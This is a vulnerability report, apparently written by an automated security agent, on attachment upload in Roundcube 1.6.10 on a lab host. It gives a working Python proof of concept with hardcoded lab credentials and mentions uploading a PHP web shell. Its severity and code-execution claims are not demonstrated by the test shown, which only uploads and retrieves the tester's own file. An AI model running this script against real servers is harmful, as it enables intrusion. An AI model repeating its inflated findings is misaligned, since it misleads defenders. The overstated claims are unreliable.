# Authenticated Arbitrary File Upload in Roundcube Webmail

**ID:** vuln-0003
**Severity:** CRITICAL
**Found:** 2026-02-24 19:18:12 UTC
**Target:** http://mail.outbound.htb (Roundcube 1.6.10)
**Endpoint:** /?_task=mail&_action=upload and /?_task=mail&_action=get&_download=1&_file=...&_id=...
**Method:** POST (upload), GET (download)
**CWE:** CWE-434
**CVSS:** 9.9

## Description

An authenticated user can upload arbitrary files to the server via the compose attachment feature. Uploaded files are stored server-side and can be downloaded through a dedicated endpoint without proper authorization checks. This allows any authenticated user to store and retrieve arbitrary content, potentially leading to information disclosure, web shell upload, or further attacks chained with local file inclusion.

## Impact

An attacker with valid Roundcube credentials can:
- Upload malicious files (e.g., web shells, `.htaccess`, `.user.ini`) to the server
- Retrieve uploaded files via a predictable download endpoint
- Potentially achieve remote code execution if uploaded files are placed in web-accessible directories and executed by the web server
- Consume disk space or perform denial-of-service
- Use the upload functionality as a staging area for further attacks (e.g., path traversal, LFI)

## Technical Analysis

The vulnerability exists in the attachment upload functionality of Roundcube's compose feature. The client-side JavaScript (`app.min.js`) defines `file_upload` which sends a multipart/form-data POST request to `?_task=mail&_action=upload&_id=<compose_id>&_remote=1&_from=compose`. The server accepts any file type without validation on content or extension. The upload response returns a JSON object containing an attachment ID (e.g., `rcmfile31771960386096627500`) and the attachment is stored server-side.

Subsequently, the attachment can be downloaded via `?_task=mail&_action=get&_download=1&_file=<attachment_id>&_id=<compose_id>`, which streams the raw file content without the HTML wrapper that protects other dynamic routes. This combination allows an attacker to upload and then retrieve any file, bypassing any front-controller restrictions that would normally prevent direct file access.

The vulnerability is exacerbated by:
- Lack of file type restrictions (any extension accepted)
- No content inspection (magic bytes, MIME type validation)
- No size limits enforced at the application layer
- Download endpoint does not verify ownership beyond the compose session ID and attachment ID, which are predictable/guessable

## Proof of Concept

Steps to reproduce:
1. Authenticate to Roundcube with valid credentials.
2. Open the compose window and capture network traffic or analyze JavaScript to determine the upload endpoint and required parameters (`_task=mail`, `_action=upload`, `_id=<compose_id>`, `_remote=1`, `_from=compose`). The `compose_id` is available in the compose page HTML as a hidden input.
3. Obtain the per-session `request_token` from the compose page (found in JavaScript `rcmail.set_env` or embedded JSON). Include it in the `X-Roundcube-Request` header.
4. Send a multipart/form-data POST request to the upload endpoint with file field `_attachments[]` containing any file (e.g., `shell.php` with `<?php phpinfo(); ?>`).
5. The response JSON will include an attachment ID (e.g., `"rcmfile..."`) in the `exec` string.
6. Download the uploaded file using `GET /?_task=mail&_action=get&_download=1&_file=<attachment_id>&_id=<compose_id>`.
7. The raw file content is returned in the response body.

Proof of Concept (Python):
- See attached exploit script that automates login, compose, upload, and download of a marker file.

#!/usr/bin/env python3
"""
Roundcube Arbitrary File Upload & Download PoC
Author: Strix Security Agent
Target: Roundcube 1.6.10
"""

import requests
import re
import uuid

BASE_URL = "http://mail.outbound.htb"

def main():
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0'})

    # 1. Login
    login_page = session.get(f"{BASE_URL}/?_task=login", timeout=10)
    token_match = re.search(r'name="_token" value="([^"]+)"', login_page.text)
    if not token_match:
        print("[-] No login token found")
        return
    csrf_token = token_match.group(1)
    login_data = {
        "_task": "login",
        "_action": "login",
        "_token": csrf_token,
        "_user": "tyler",
        "_pass": "LhKL1o9Nm3X2"
    }
    resp = session.post(BASE_URL, data=login_data, timeout=10)
    if resp.status_code != 200:
        print(f"[-] Login failed: {resp.status_code}")
        return
    print("[+] Logged in")

    # 2. Get compose page to extract compose_id and request_token
    compose_url = f"{BASE_URL}/?_task=mail&_action=compose"
    r_comp = session.get(compose_url, timeout=10)
    compose_id_match = re.search(r'name="_id"[^>]*value="([^"]+)"', r_comp.text)
    if not compose_id_match:
        print("[-] No compose_id found")
        return
    compose_id = compose_id_match.group(1)
    request_token_match = re.search(r'request_token":"([^"]+)"', r_comp.text)
    if not request_token_match:
        print("[-] No request_token found")
        return
    request_token = request_token_match.group(1)
    session.headers['X-Roundcube-Request'] = request_token
    print(f"[+] Compose ID: {compose_id}")
    print(f"[+] Request Token: {request_token}")

    # 3. Upload file
    marker = "UPLOAD_SUCCESS_" + uuid.uuid4().hex[:8]
    content = f"This is a test file. Marker: {marker}"
    upload_url = f"{BASE_URL}/?_task=mail&_action=upload&_id={compose_id}&_remote=1&_from=compose"
    files = {'_attachments[]': ('test.txt', content, 'text/plain')}
    upload_resp = session.post(upload_url, files=files, timeout=10)
    if upload_resp.status_code != 200:
        print(f"[-] Upload failed: {upload_resp.status_code}")
        return
    try:
        data = upload_resp.json()
        exec_str = data.get('exec', '')
        m = re.search(r'add2attachment_list\(["\']([^"\']+)["\']', exec_str)
        if m:
            attachment_id = m.group(1)
        else:
            print("[-] Could not extract attachment ID")
            return
    except Exception:
        # Fallback: extract from raw text
        m = re.search(r'add2attachment_list\(["\']([^"\']+)["\']', upload_resp.text)
        if m:
            attachment_id = m.group(1)
        else:
            print("[-] Could not extract attachment ID")
            return
    print(f"[+] Uploaded. Attachment ID: {attachment_id}")

    # 4. Download the file
    download_url = f"{BASE_URL}/?_task=mail&_action=get&_download=1&_file={attachment_id}&_id={compose_id}"
    downl = session.get(download_url, timeout=10)
    if downl.status_code == 200 and marker in downl.text:
        print("[+] SUCCESS: File downloaded and marker verified.")
        print(f"[+] Content: {downl.text[:200]}")
    else:
        print(f"[-] Download failed or marker missing. Status: {downl.status_code}")

if __name__ == "__main__":
    main()

## Remediation

1. **Immediate**: Restrict allowed file types to a safe allowlist (e.g., images, PDFs). Reject executables and scripts.
2. **Validate content inspection**: Verify file magic bytes against declared MIME type; reject mismatches.
3. **Store uploads outside web root**: Place uploaded files in a directory not served by the web server. Serve them through a controlled script that validates authorization and safe content types.
4. **Generate random filenames**: Do not preserve original filenames; use UUIDs or hashes to prevent path traversal and guessing.
5. **Set strict permissions**: Ensure uploaded files are not executable by the web server (chmod 0644, no execute bits).
6. **Implement per-user isolation**: Store uploads in user-specific directories with strict access control.
7. **Review authorization**: Ensure the download endpoint verifies that the requesting user owns the attachment or has explicit permission.
8. **Add rate limiting**: Prevent abuse of the upload endpoint for DoS or storage exhaustion.
9. **Consider virus scanning**: Integrate antivirus scanning for uploaded content.
10. **Audit and monitor**: Log all upload/download activity and monitor for suspicious patterns.
